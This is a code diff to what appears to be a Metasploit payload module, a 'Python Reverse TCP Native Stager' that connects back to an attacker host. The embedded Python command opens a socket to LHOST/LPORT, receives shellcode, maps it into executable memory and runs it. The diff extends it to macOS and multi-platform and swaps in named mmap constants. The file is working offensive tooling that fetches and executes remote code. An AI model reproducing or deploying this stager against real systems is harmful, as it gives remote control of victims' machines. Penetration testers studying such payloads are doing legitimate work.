@@ -17,11 +17,11 @@ module MetasploitModule
 
   def initialize(info = {})
     super(merge_info(info,
-      'Name'          => 'Python Reverse TCP Stager',
+      'Name'          => 'Python Reverse TCP Native Stager',
       'Description'   => 'Connect back to the attacker via python to load a native meterpreter stage',
       'Author'        => 'pasta <jaguinaga@faradaysec.com>',
       'License'       => MSF_LICENSE,
-      'Platform'      => 'linux',
+      'Platform'      => ['multi', 'osx', 'linux'],
       'Arch'          => ARCH_X64,
       'Handler'       => Msf::Handler::ReverseTcp,
       'Stager'        => { 'Payload' => '' }))
@@ -32,16 +32,16 @@ module MetasploitModule
   end
 
   def command_string
-    raw_cmd = %(import socket,struct,ctypes,ctypes.util
+    raw_cmd = %(import socket,struct,ctypes,ctypes.util,mmap
 s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((\"#{datastore['LHOST']}\",#{datastore['LPORT']}))
 sc=b\"\\xbf\"+struct.pack(\"<L\",s.fileno())+s.recv(4096)
 l=ctypes.CDLL(ctypes.util.find_library(\"c\"))
 l.mmap.restype=ctypes.c_void_p
 l.mprotect.argtypes=[ctypes.c_void_p,ctypes.c_int,ctypes.c_int]
-m=l.mmap(0,len(sc),3,0x1002,-1,0)
+m=l.mmap(0,len(sc),mmap.PROT_READ|mmap.PROT_WRITE,mmap.MAP_ANONYMOUS|mmap.MAP_PRIVATE,-1,0)
 ctypes.memmove(m,sc,len(sc))
-l.mprotect(m,len(sc),5)
+l.mprotect(m,len(sc),mmap.PROT_READ|mmap.PROT_EXEC)
 ctypes.CFUNCTYPE(ctypes.c_int)(m)())
     raw_cmd.gsub!("\n",";")
     encoded_cmd = Rex::Text.encode_base64(raw_cmd)
